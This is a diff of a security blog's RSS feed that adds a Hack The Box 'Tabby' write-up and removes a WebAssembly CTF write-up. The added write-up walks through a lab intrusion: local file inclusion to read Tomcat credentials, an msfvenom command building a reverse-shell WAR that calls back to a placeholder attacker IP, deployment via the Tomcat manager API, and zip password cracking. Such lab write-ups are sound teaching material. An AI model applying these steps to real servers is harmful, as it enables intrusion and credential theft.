@@ -1,4 +1,81 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Dev & Security]]></description><link>https://inesmartins.github.io//</link><image><url>https://inesmartins.github.io//favicon.png</url><title>Inês Martins</title><link>https://inesmartins.github.io//</link></image><generator>Ghost 3.18</generator><lastBuildDate>Wed, 28 Oct 2020 12:06:17 GMT</lastBuildDate><atom:link href="https://inesmartins.github.io//rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[ØxOPOSɆC | Underground Leaks (Crypto)]]></title><description><![CDATA[<pre><code>Rui Tinto admitted having some information about the snitch from the 0XOPOLEAKS. However, he's unwilling to give the passwords unless his demands of having Kripthor on 0xOPOSEC get fulfilled. 
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Dev & Security]]></description><link>https://inesmartins.github.io//</link><image><url>https://inesmartins.github.io//favicon.png</url><title>Inês Martins</title><link>https://inesmartins.github.io//</link></image><generator>Ghost 3.18</generator><lastBuildDate>Sat, 07 Nov 2020 21:59:41 GMT</lastBuildDate><atom:link href="https://inesmartins.github.io//rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[HTB Write-up | Tabby [DONE]]]></title><description><![CDATA[<blockquote><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/259">here</a>.</em></blockquote><h2 id="scanning">Scanning</h2><pre><code>~ nmap -sC -sV -A -T4 tabby.htb
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-04 17:47 WEST
+Nmap scan report for tabby.htb (10.10.10.194)
+Host is up (0.30s latency).
+Not shown: 996 closed ports
+
+PORT     STATE    SERVICE</code></pre>]]></description><link>https://inesmartins.github.io//dnp-htb-2/</link><guid isPermaLink="false">5efcd8e41e7da103a083e97f</guid><category><![CDATA[htb]]></category><category><![CDATA[tomcat]]></category><category><![CDATA[fcrackzip]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 07 Nov 2020 21:59:12 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/07/Hack-The-Box----Tabby-2020-07-09-21-15-07.png" medium="image"/><content:encoded><![CDATA[<blockquote><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/259">here</a>.</em></blockquote><h2 id="scanning">Scanning</h2><pre><code>~ nmap -sC -sV -A -T4 tabby.htb
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-04 17:47 WEST
+Nmap scan report for tabby.htb (10.10.10.194)
+Host is up (0.30s latency).
+Not shown: 996 closed ports
+
+PORT     STATE    SERVICE  VERSION
+22/tcp   open     ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open     http     Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Mega Hosting
+8080/tcp open     http     Apache Tomcat
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 49.59 seconds</code></pre><h3 id="port-80">Port 80</h3><img src="https://inesmartins.github.io//content/images/2020/07/Hack-The-Box----Tabby-2020-07-09-21-15-07.png" alt="HTB Write-up | Tabby [DONE]"><p>The Apache server running on port <code>80</code> seems to be the website for a hosting company called "Mega Hosting":</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/Mega-Hosting-2020-07-01-19-43-52-3.png" class="kg-image" alt="HTB Write-up | Tabby [DONE]"></figure><p>The home page has a link for their "statement on recovering from the data breach". When we click the link we're redirected to <a href="http://megahosting.htb/news.php?file=statement">http://megahosting.htb/news.php?file=statement</a>. This domain is not available, however, if we access the page on the <code>tabby.htb</code> domain we see the following message:</p><pre><code>We apologise to all our customers for the previous data breach.
+
+We have changed the site to remove this tool, and have invested heavily in more secure servers</code></pre><p>So, from this statement we understand that a <em>tool </em>was removed from the site, which might be our foothold.</p><p>Also very interesting is the way that the <code>statement</code> file is being fetched, let's see if we can fetch any file we want:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/VULNS.png" class="kg-image" alt="HTB Write-up | Tabby [DONE]"></figure><p>Bingo! </p><hr><h3 id="port-8080">Port 8080</h3><p>When we access port <code>8080</code> we see the "default Tomcat home page".</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/Apache-Tomcat-2020-07-01-19-45-46.png" class="kg-image" alt="HTB Write-up | Tabby [DONE]"></figure><p>Since we've already identified a <a href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability">Local File Inclusion vulnerability</a> on port <code>80</code>, the next logic step would be to try and access the credentials file on the server, however, this file was not in the typical location, in fact, it took me a couple of hours to find it hosted at <code>usr/share/tomcat9/etc/tomcat-users.xml</code>.</p><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+...
+&lt;tomcat-users xmlns="http://tomcat.apache.org/xml"
+   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+   xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+   version="1.0"&gt;
+ ...
+   &lt;role rolename="admin-gui"/&gt;
+   &lt;role rolename="manager-script"/&gt;
+   &lt;user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/&gt;
+&lt;/tomcat-users&gt;</code></pre><hr><h2 id="getting-user">Getting User</h2><p>As we can see above, <code>tomcat</code> has the following roles:</p><ul><li><code>admin-gui</code>: allows the user to access the host-manager's <a href="http://tabby.htb:8080/host-manager/html">graphical interface</a>;</li><li><code>manager-script</code>: allows the user to access the manager's <a href="http://tabby.htb:8080/manager/text/">text interface</a> and <a href="http://tabby.htb:8080/manager/status/all">server status</a>.</li></ul><p>The text interface is basically a <a href="https://tomcat.apache.org/tomcat-9.0-doc/host-manager-howto.html">REST API</a> that is able to execute some commands. Let's try to list all the applications running on this server:</p><pre><code>~ curl -u "tomcat" http://tabby.htb:8080/manager/text/list
+Enter host password for user 'tomcat': $3cureP4s5w0rd123!
+
+OK - Listed applications for virtual host [localhost]
+/:running:0:ROOT
+/examples:running:2:/usr/share/tomcat9-examples/examples
+/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
+/shell:running:3:shell
+/my-shell2:running:10:my-shell2
+/siren.war:running:0:siren.war
+/my-shell4:running:1:my-shell4
+/manager:running:0:/usr/share/tomcat9-admin/manager
+/docs:running:0:/usr/share/tomcat9-docs/docs
+/my-shell:running:1:my-shell
+/my-shell1:running:2:my-shell1</code></pre><p>OK, as we can see a couple of other HTB users have clearly abused this feature, let's try to upload our own reverse shell using this interface:</p><pre><code>~ curl -T "./php-reverse-shell.php" "http://tabby.htb:8080/manager/text/deploy?path=/shelly&amp;update=true" -u tomcat
+Enter host password for user 'tomcat': $3cureP4s5w0rd123!
+
+FAIL - Deployed application at context path [/shelly] but context failed to start</code></pre><p>Turns out the shell was uploaded but since it's not a <code>.war</code> it's not run by the server. After searching how to embed a reverse shell in a <code>.war</code> file I came across <a href="https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/">this</a> article that provided a bunch of different methods. This was the most effective:</p><pre><code>~ msfvenom -p java/jsp_shell_reverse_tcp LHOST=OUR_IP LPORT=4444 -f war &gt; shelly.war
+
+~ curl -T "./shelly.war" "http://tabby.htb:8080/manager/text/deploy?path=/shelly&amp;update=true" -u tomcat
+Enter host password for user 'tomcat': $3cureP4s5w0rd123!
+OK - Deployed application at context path [/shelly]</code></pre><p>Now when we access <code>http://tabby.htb:8080/shelly/</code> we get a reverse shell. <br>Let's upgrade it!</p><pre><code>~ /usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre><p>I tried authenticating with <code>su</code> as the user <code>ash</code> with the password we already know and also with  <code>clive</code>, which we found on the <code>/etc/passwd</code> file, but both failed.</p><h3 id="looking-for-anything-interesting">Looking for Anything Interesting</h3><p>We start by looking for files belonging to <code>ash</code> and come across an interesting zip file:</p><pre><code>tomcat@tabby:/var$ find ./ -user ash
+...
+./www/html/files
+./www/html/files/16162020_backup.zip</code></pre><p>The file is password protected but neither <code>clive</code> nor <code>$3cureP4s5w0rd123!</code> work. Let's try to bruteforce it!  First we need to <a href="https://inesmartins.github.io//how-to-dowload-files-from-reverse-shells-on-macos/">download the file</a> to our machine and then we can use a zip file cracker, such as <code>fcrackzip</code> to get the password:</p><pre><code>kali@kali:~/$ fcrackzip -D -p rockyou.txt tabby.zip -u
+PASSWORD FOUND!!!!: pw == admin@it
+
+kali@kali:~/$ unzip tabby.zip 
+Archive:  tabby.zip
+[tabby.zip] var/www/html/favicon.ico password: 
+  inflating: var/www/html/favicon.ico  
+  inflating: var/www/html/index.php  
+ extracting: var/www/html/logo.png   
+  inflating: var/www/html/news.php   
+  inflating: var/www/html/Readme.txt
+</code></pre><p>Turns out there's nothing useful on this extracted folder, but the password can be use to login as <code>ash</code>:</p><pre><code>tomcat@tabby:/var/www/html$ su - ash
+su - ash
+Password: admin@it
+
+ash@tabby:~$ cat user.txt</code></pre><p>Finally, let's SSL into the machine after adding the public key to <code>/home/ash/.ssh/authorized_key</code>:</p><pre><code>ssh -i ash@tabby.htb</code></pre><hr><h2 id="getting-root">Getting root</h2><blockquote>Relatively simple, but new to me (which was quite fun). What powers do you currently have? Linpeas will point you in the right direction.</blockquote><blockquote>Don't think outside the box, think outside the container.</blockquote><blockquote>1. Check your home folder thoroughly<br>2. Google it, you will get your attack vector. With step by step execution</blockquote><pre><code>ash@tabby:~$ ls
+alpine-v3.12-x86_64-20200710_0223.tar.gz  snap  user.txt</code></pre><p>Seeing the <code>alpine</code> zip file I realised the privilege escalation will probably be related to <code>lxd</code>. As always, I <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">followed</a> this article and got the root flag.</p>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC | Underground Leaks (Crypto)]]></title><description><![CDATA[<pre><code>Rui Tinto admitted having some information about the snitch from the 0XOPOLEAKS. However, he's unwilling to give the passwords unless his demands of having Kripthor on 0xOPOSEC get fulfilled. 
 Meanwhile, government forces tried to crack the passwords with no success. 
 We know from underground sources that Rui Tinto does cipher</code></pre>]]></description><link>https://inesmartins.github.io//oposec/</link><guid isPermaLink="false">5f89dd96b225522b040c4394</guid><category><![CDATA[crypto]]></category><category><![CDATA[java]]></category><category><![CDATA[ctf]]></category><category><![CDATA[oposec]]></category><category><![CDATA[random]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Tue, 27 Oct 2020 22:02:35 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/10/highres_471963990-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<pre><code>Rui Tinto admitted having some information about the snitch from the 0XOPOLEAKS. However, he's unwilling to give the passwords unless his demands of having Kripthor on 0xOPOSEC get fulfilled. 
 Meanwhile, government forces tried to crack the passwords with no success. 
@@ -1421,94 +1498,4 @@ var decrypted = CryptoJS.AES.decrypt(
 
 console.log(decrypted.toString())
 
-// 50617373573052442132383925212a -&gt; (from hex) PassW0RD!289%!*</code></pre>]]></content:encoded></item><item><title><![CDATA[Web Assembly CTF Write-up]]></title><description><![CDATA[<p><em>Banner source: <a href="https://medium.com/trainingcenter/webassembly-a-jornada-o-que-%C3%A9-wasm-75e3f0f03124">https://medium.com/trainingcenter/webassembly-a-jornada-o-que-%C3%A9-wasm-75e3f0f03124</a></em></p><p>I'm been trying to get into Web Assembly for a while, so when I found <a href="https://medium.com/@cyjien/misc-js-scripting-ctf-writeup-ae74b45cb2c0">this CTF write-up</a> by Chiam YJ I decided to give it a try.</p><h1 id="the-original-challenge">The original Challenge</h1><pre><code class="language-javascript">&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;</code></pre>]]></description><link>https://inesmartins.github.io//js-wasm-ctf-write-up/</link><guid isPermaLink="false">5ef27a571e7da103a083e133</guid><category><![CDATA[web-assembly]]></category><category><![CDATA[wasm]]></category><category><![CDATA[ctf]]></category><category><![CDATA[write-up]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Tue, 23 Jun 2020 22:00:44 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/1_f__SEWRvsNwt4B-u8-85Bw.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/1_f__SEWRvsNwt4B-u8-85Bw.png" alt="Web Assembly CTF Write-up"><p><em>Banner source: <a href="https://medium.com/trainingcenter/webassembly-a-jornada-o-que-%C3%A9-wasm-75e3f0f03124">https://medium.com/trainingcenter/webassembly-a-jornada-o-que-%C3%A9-wasm-75e3f0f03124</a></em></p><p>I'm been trying to get into Web Assembly for a while, so when I found <a href="https://medium.com/@cyjien/misc-js-scripting-ctf-writeup-ae74b45cb2c0">this CTF write-up</a> by Chiam YJ I decided to give it a try.</p><h1 id="the-original-challenge">The original Challenge</h1><pre><code class="language-javascript">&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-    &lt;meta charset="utf-8"/&gt;
-    &lt;title&gt;crypto&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;/body&gt;
-&lt;script type="text/javascript"&gt;
-    var bin = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,0,1,127,96,1,127,1,127,3,131,128,128,128,0,2,0,1,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,163,128,128,128,0,3,6,109,101,109,111,114,121,2,0,14,103,101,116,73,110,83,116,114,79,102,102,115,101,116,0,0,5,109,111,114,112,104,0,1,10,148,129,128,128,0,2,132,128,128,128,0,0,65,16,11,133,129,128,128,0,1,6,127,2,64,32,0,65,1,72,13,0,65,0,33,3,3,64,32,3,65,208,0,106,34,1,32,3,65,16,106,45,0,0,34,4,58,0,0,2,64,32,3,65,1,72,13,0,65,0,33,5,32,3,33,6,2,64,3,64,32,4,32,6,65,15,106,45,0,0,115,33,4,32,6,65,2,72,13,1,32,6,65,127,106,33,6,32,5,65,4,72,33,2,32,5,65,1,106,33,5,32,2,13,0,11,11,32,1,32,4,58,0,0,11,32,3,65,1,106,34,3,32,0,71,13,0,11,11,65,208,0,11]);
-    var m = new WebAssembly.Instance(new WebAssembly.Module(bin));
-    var offset = m.exports.getInStrOffset();
-    var flag = prompt("teh flag?");
-	  var strBuf = new TextEncoder().encode(flag.slice(0, 64));
-	  var inBuf = new Uint8Array(m.exports.memory.buffer, offset, strBuf.length);
-	  for (let i = 0; i &lt; strBuf.length; i++) {
-        inBuf[i] = strBuf[i];
-    }
-	  var morph = m.exports.morph(strBuf.length);	
-    var outBuf = new Uint8Array(m.exports.memory.buffer, morph, strBuf.length);
-
-    if (btoa(new TextDecoder().decode(outBuf)) === "dxB9BH8RVRMKG1NPI3UyOFRIJyJObAZdXkF8DUEJ") {
-        document.write("congratz!");
-    } else {
-        document.write("nope!");
-    }
-&lt;/script&gt;
-&lt;/html&gt;
-</code></pre><h1 id="static-code-analysis">Static Code Analysis</h1><p>We can divide the code into major sections:</p><h3 id="1-compiling-and-loading-the-binary-code">1. Compiling and Loading the binary Code</h3><p>A <code>WebAssembly.Instance</code> object is a stateful, executable instance of a <code>WebAssembly.Module</code> that contains all the <a href="https://developer.mozilla.org/en-US/docs/WebAssembly/Exported_functions">Exported WebAssembly functions</a>. </p><p>In this case, we're creating a new <code>WebAssembly.Instance</code> object (<code>m</code>) that contains all the Exported WebAssembly functions that derive from the compilation of the bytes in the <code>bin</code> byte array.</p><pre><code class="language-javascript">var bin = new Uint8Array([0,97,115,109,1,0,0,0,1,...]);
-var m = new WebAssembly.Instance(new WebAssembly.Module(bin));)]</code></pre><h3 id="2-encoding-transforming-the-user-input">2. Encoding/Transforming the User Input</h3><p>First, this script starts by converting the first 64 characters introduced by the user into bytes and then writes them to <code>strBuf</code> .</p><pre><code class="language-javascript">var offset = m.exports.getInStrOffset();
-var flag = prompt("teh flag?");
-var strBuf = new TextEncoder().encode(flag.slice(0, 64));</code></pre><p>When the <code>Uint8Array</code> constructor "is called with a buffer, and optionally a byteOffset and a length argument, a new typed array view is created that views the specified ArrayBuffer. (...)" [<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Uint8Array/Uint8Array">Source</a>]. </p><p>In this case, the <code>inBuf</code> variable represents a typed array that (most likely) views the entirety of the <code>memory.buffer</code> (this depends on how the <code>getInStrOffset</code> function works and we don't have access to it).</p><pre><code class="language-javascript">var inBuf = new Uint8Array(m.exports.memory.buffer, offset, strBuf.length);</code></pre><p>Then, this new <code>Uint8Array</code> is filled with the bytes from <code>strBuf</code>.</p><pre><code class="language-javascript">for (let i = 0; i &lt; strBuf.length; i++) {
-    inBuf[i] = strBuf[i];
-}</code></pre><p>Finally, the <code>Uint8Array</code> constructor is called with <code>morph</code> as the second parameter. We don't really know what <code>morph</code> does but it seems that the <code>inBuf</code> bytes are being transformed (somehow) and written to the <code>outBuf</code> array.</p><pre><code class="language-javascript">var morph = m.exports.morph(strBuf.length);	
-var outBuf = new Uint8Array(m.exports.memory.buffer, morph, strBuf.length);</code></pre><h3 id="3-string-comparison">3. String comparison</h3><p>Finally the bytes in the <code>outBuf</code> are decoded back into ASCII, then encoded using Base64, and then compared with the hardcoded base64 key: if they're equal, success!</p><pre><code class="language-jsx">btoa(new TextDecoder().decode(outBuf)) === "dxB9BH8RVRMKG1NPI3UyOFRIJyJObAZdXkF8DUEJ"
-</code></pre><h2 id="1-finding-the-uint8array-that-matches-the-flag">1. Finding the Uint8Array that matches the flag</h2><p>We start by reversing the last step in order to get the <code>outBuf</code> that when encoded matches the hardcoded key:</p><pre><code class="language-javascript">var key = "dxB9BH8RVRMKG1NPI3UyOFRIJyJObAZdXkF8DUEJ"
-var base64decoded = atob(key)
-var textEncoded = new TextEncoder().encode(base64decoded)
-console.log(textEncoded)
-// Uint8Array(30) [119, 16, 125, 4, 127, 17, 85, 19, 10, 27, 83, 79, 35, 117, 50, 56, 84, 72, 39, 34, 78, 108, 6, 93, 94, 65, 124, 13, 65, 9]
-</code></pre><h2 id="2-brute-forcing-for-the-solution">2. Brute-forcing for the Solution</h2><p>In order to get the flag, we're going to brute-force the solution by comparing the  <code>outBuf</code> that results from each char with the successful buffer found in the previous step, byte by byte.</p><pre><code class="language-javascript">var bin = new Uint8Array([0,97,115,109,1,0,0,0,1,...]);
-var m = new WebAssembly.Instance(new WebAssembly.Module(bin));
-var offset = m.exports.getInStrOffset();
-
-var successOutBuf = [119, 16, 125, 4, 127, 17, 85, 19, 10, 27, 83, 79, 35, 117, 50, 56, 84, 72, 39, 34, 78, 108, 6, 93, 94, 65,  124, 13, 65, 9];
-
-var alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\\"#$%&amp;\\'()*+,-./:;&lt;=&gt;?@[\\\\]^_`{|}~";
-
-var match = function(flag, pos) {
-	console.log("Test flag: " + flag)
-	var strBuf = new TextEncoder().encode(flag.slice(0, 64));
-	var inBuf = new Uint8Array(m.exports.memory.buffer, offset, strBuf.length);
-  for (var i = 0; i &lt; strBuf.length; i++) {
-		inBuf[i] = strBuf[i];
-  }
-  var morph = m.exports.morph(strBuf.length);	
-  var outBuf = new Uint8Array(m.exports.memory.buffer, morph, strBuf.length);
-  console.log("Comparing " + outBuf[pos] + " with " + successOutBuf[pos])
-  if (outBuf[pos] == successOutBuf[pos]) {
-	  return true;
-  }
-  return false;
-}
-  
-
-var pos = 0;
-var flag = "";
-var letter = 0;
-var foundPos = false;
-
-while (pos &lt; 30) {
-	foundPos = false
-  for (var letter = 0; letter &lt; alphabet.length; letter++) {
-	  if (!foundPos) {
-	    var tmpLetter = alphabet[letter];
-      var testFlag = flag + tmpLetter;
-      var foundPos = match(testFlag, pos);
-      if (foundPos) {
-	      flag += tmpLetter;
-        console.log("Found match! Updated flag: " + flag);
-        pos++;
-      }
-    }
-  }
-  if (!foundPos) {
-    alert("Didn't find match!")
-  }
-}
-</code></pre><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/res.png" class="kg-image" alt="Web Assembly CTF Write-up"></figure><p>Hope you enjoyed it :)</p>]]></content:encoded></item></channel></rss>
+// 50617373573052442132383925212a -&gt; (from hex) PassW0RD!289%!*</code></pre>]]></content:encoded></item></channel></rss>
